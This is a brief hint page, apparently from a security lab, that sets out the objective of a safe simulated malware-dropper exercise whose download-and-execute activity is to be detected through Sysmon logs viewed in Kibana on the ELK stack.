# Hint 02: Malware Detection (Simulated)

---

## üéØ Objective

The goal of this simulation is to mimic the behavior of a malware dropper ‚Äî a script that downloads and executes a remote payload ‚Äî and detect this activity through logs generated by Sysmon and visualized in Kibana via the ELK stack.

This is a **safe simulation** that does not use real malware, but helps us understand how malware activity is logged and detected by endpoint logging tools and SIEM platforms.
